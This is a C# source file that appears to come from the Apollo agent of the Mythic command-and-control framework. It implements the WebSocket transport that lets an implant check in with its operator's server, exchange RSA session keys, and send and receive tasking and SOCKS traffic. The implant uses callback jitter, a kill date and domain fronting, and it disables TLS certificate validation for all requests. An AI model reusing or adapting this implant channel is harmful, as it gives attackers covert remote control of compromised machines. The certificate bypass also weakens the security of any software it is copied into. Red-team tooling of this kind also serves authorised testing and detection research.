using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;
using System.Collections.Concurrent;
using ST = System.Threading.Tasks;
using System.Threading;
using ApolloInterop.Serializers;
using WebsocketTransport.Models;
using WebSocketSharp;

namespace WebsocketTransport
{
    public class WebsocketProfile : C2Profile, IC2Profile
    {
        internal WebSocket Client;

        private int CallbackInterval;
        private double CallbackJitter;
        private int CallbackPort;
        private string CallbackHost;
        private string PostUri;
        // synthesis of CallbackHost, CallbackPort, PostUri
        private string Endpoint;
        private bool EncryptedExchangeCheck;
        private string UserAgent;
        private string TaskingType;
        private string KillDate;
        private string DomainFront;
        // synthesis of ProxyHost and ProxyPort
        private string ProxyAddress;
        private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
        private bool _uuidNegotiated = false;
        private bool _keyExchanged = false;
        private RSAKeyGenerator rsa = null;
        private static ConcurrentQueue<byte[]> senderQueue = new ConcurrentQueue<byte[]>();
        private ST.Task agentConsumerTask = null;
        private ST.Task agentProcessorTask = null;
        private static JsonSerializer jsonSerializer = new JsonSerializer();
        private static AutoResetEvent senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AutoResetEvent receiverEvent = new AutoResetEvent(false);
        private Action sendAction;
        private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
        private string Uuid = "";

        public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            CallbackPort = int.Parse(data["callback_port"]);
            CallbackHost = data["callback_host"];
            TaskingType = data["tasking_type"];
            UserAgent = data["USER_AGENT"];
            Uuid = agent.GetUUID();
            PostUri = data["ENDPOINT_REPLACE"];
            DomainFront = data["domain_front"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            rsa = agent.GetApi().NewRSAKeyPair(4096);

            if (PostUri[0] != '/')
            {
                PostUri = $"/{PostUri}";
            }
            Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
            KillDate = data["killdate"];

            string[] reservedStrings = new[]
            {
                "callback_interval",
                "callback_jitter",
                "callback_port",
                "callback_host",
                "ENDPOINT_REPLACE",
                "encrypted_exchange_check",
                "killdate",
                "USER_AGENT"
            };

            foreach (string k in data.Keys)
            {
                if (!reservedStrings.Contains(k))
                {
                    _additionalHeaders.Add(k, data[k]);
                }
            }

            // Disable certificate validation on web requests
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            Agent.SetSleep(CallbackInterval, CallbackJitter);
            sendAction = () =>
            {
                while (Client.IsAlive)
                {
                    senderEvent.WaitOne();
                    if (senderQueue.TryDequeue(out byte[] result))
                    {
                        Console.WriteLine("Sending:");
                        Console.WriteLine(Encoding.UTF8.GetString(result));
                        Client.Send(result);
                    }
                }
            };
        }

        private void Poll()
        {
            agentProcessorTask = new ST.Task(() =>
            {
                while (Agent.IsAlive())
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });

            agentProcessorTask.Start();

            while (Agent.IsAlive())
            {
                Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                {
                    AddToSenderQueue(tm);
                    return true;
                });
                Agent.Sleep();
            }
        }
        private void Push()
        {
            agentConsumerTask = new ST.Task(() =>
            {
                while (Agent.IsAlive())
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        }
                        return false;
                    }))
                    {
                        Thread.Sleep(100);
                    }
                }
            });
            agentProcessorTask = new ST.Task(() =>
            {
                while (Agent.IsAlive())
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });
            agentConsumerTask.Start();
            agentProcessorTask.Start();
            agentProcessorTask.Wait();
            agentConsumerTask.Wait();
        }

        public void Start()
        {
            if (TaskingType == "Poll")
            {
                Poll();
            } else if (TaskingType == "Push")
            {
                Push();
            }
        }


        public bool IsOneWay()
        {
            return false;
        }

        public bool Send<T>(T message)
        {
            throw new Exception("WebsocketProfile does not support Send only.");
        }

        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                receiverEvent.WaitOne();
                IMythicMessage msg = receiverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    receiverQueue = new ConcurrentQueue<IMythicMessage>(receiverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
                if (!Connected)
                    break;
            }
            return true;
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (Client == null)
            {
                Client = new WebSocket(Endpoint + PostUri);

                if (TaskingType == "Push")
                {
                    Client.CustomHeaders = new List<KeyValuePair<string, string>>
                    {
                        new KeyValuePair<string, string>("Accept-Type", "Push")
                    };
                }
                
                //TODO TEST
                // Use Default Proxy and Cached Credentials for Internet Access

                IWebProxy wr = WebRequest.GetSystemWebProxy();
                wr.Credentials = CredentialCache.DefaultCredentials;
                //Client.Proxy = wr;
                
                Client.ConnectAsync();
                Client.OnOpen += OnAsyncConnect;
                Client.OnMessage += OnAsyncMessageReceived;
                Client.OnClose += OnAsyncDisconnect;
            }

            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = this.rsa.ExportPublicKey(),
                    SessionID = this.rsa.SessionId
                };
                AddToSenderQueue(handshake1);

                if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
                {
                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    _keyExchanged = true;
                    return true;
                }))
                {
                    return false;
                }
            }

            AddToSenderQueue(checkinMsg);
            if (agentProcessorTask == null || agentProcessorTask.IsCompleted)
            {
                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse mResp = (MessageResponse)resp;
                    if (!_uuidNegotiated)
                    {
                        _uuidNegotiated = true;
                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                        checkinMsg.UUID = mResp.ID;
                    }
                    Connected = true;
                    return onResp(mResp);
                });
            }
            else
            {
                return true;
            }
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            WebSocketMessage m = new WebSocketMessage()
            {
                client = true,
                data = "",
                tag = String.Empty
            };
            if (_keyExchanged)
            {
                m.data = Serializer.Serialize(msg);
            }
            else
            {
                m.data = Serializer.Serialize(msg);
                //m.data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid + jsonSerializer.Serialize(msg)));
            }
            string message = jsonSerializer.Serialize(m);
            senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));

            senderEvent.Set();
            return true;
        }

        private void OnAsyncDisconnect(object sender, CloseEventArgs args)
        {
            Console.WriteLine("OnAsyncDisconnect");
        }

        private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
        {
            Console.WriteLine("Received:");
            Console.WriteLine(args.Data);

            WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);

            if (EncryptedExchangeCheck)
            {
                if (!_keyExchanged)
                {
                    receiverQueue.Enqueue(Serializer.Deserialize<EKEHandshakeResponse>(wsm.data));
                }
                else
                {
                    receiverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
                }
            }
            else
            {
                receiverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
            }

            receiverEvent.Set();
        }


        private void OnAsyncConnect(object sender, EventArgs args)
        {
            if (writerTasks.Count > 0)
            {
                Client.Close();
                return;
            }

            ST.Task tmp = new ST.Task(sendAction);
            writerTasks[Client] = tmp;
            writerTasks[Client].Start();
            Connected = true;
        }
    }
}
